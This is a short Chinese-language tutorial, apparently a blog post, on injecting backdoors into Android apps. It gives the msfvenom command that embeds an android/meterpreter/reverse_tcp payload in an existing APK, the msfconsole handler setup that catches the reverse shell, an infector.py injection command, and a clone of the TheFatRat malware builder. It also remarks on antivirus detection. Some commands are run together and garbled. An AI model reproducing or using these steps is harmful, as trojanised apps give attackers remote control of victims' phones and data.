### 🥤msfvenom

众所周知，msfvenom是kali中生成木马的命令。我们也可以利用此命令给app添加后门。只需添加`-X`参数即可 在使用此命令之前，我们先要安装几个依赖环境。

```
apt-get install apktool apksigner zipalign

```

然后执行命令

```
msfvenom -x 2.apk -p android/meterpreter/reverse_tcp lhost=192.168.50.123 lport=4444 -o
 k.apk
```

`2.apk`便是我们要加入后门的app

![](../Images/53fc32a219896e2d4b09fcec3a6ad61a.png)

接着我们配置msf

```
msfconsole
use
 exploit/multi/handlerset payload android/meterpreter
/reverse_tcpset lhost 192.168.50.123
set lport 4444
run

```

![](../Images/6469449afd232935bdc205a0bbe60310.png)

运行app后，成功得到反弹。![](../Images/63df46786eec6c75db8b92acc0f1d4a3.png)  

优缺点：

优点：安装依赖比较少，简单快速。

缺点：加入后门的app为原生app，不能加壳。加壳后注入不成功。免杀效果一般，报毒！

```

```

![](../Images/b96c6f83f06d9cb8c2af23724d488378.png)

注入命令

```
python3 infector.py --lhost 192.168.50.123 --lport=4444

```

![](../Images/68b30c4931888a6887e32db69f301721.png)

### 🧺TheFatRat

`TheFatRat` 是一种利用著名的有效载荷编译恶意软件的利用工具，利用此工具，我们能很轻松的完成对app的注入。

```
git clone
 https://github.com/Screetsec/TheFatRat.gitcd TheFatRat
chmod +x setup.sh

```

### 🧭后记

无论是哪种工具，成功与否不在于工具，而是程序本身。由于程序本身设计或开发存在的问题，导致shell代码的注入。当然如果对app进行加壳加固，这也使得app注入会更加困难。
